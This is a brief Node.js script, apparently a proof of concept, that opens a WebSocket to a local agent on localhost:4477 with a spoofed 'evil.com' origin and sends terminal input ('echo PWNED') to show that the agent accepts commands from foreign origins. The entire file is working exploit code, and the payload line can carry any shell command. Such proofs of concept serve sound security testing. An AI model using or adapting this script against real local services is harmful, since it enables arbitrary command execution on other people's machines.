const WebSocket = require('ws');
const ws = new WebSocket('ws://localhost:4477', { origin: 'https://evil.com' });
ws.on('open', () => {
    console.log('Connected to local agent from evil origin!');
    ws.send(JSON.stringify({ type: 'input', data: 'echo PWNED\n' }));
});
ws.on('message', (msg) => {
    console.log('Received:', msg.toString());
});
ws.on('error', (err) => {
    console.error('Error:', err.message);
});
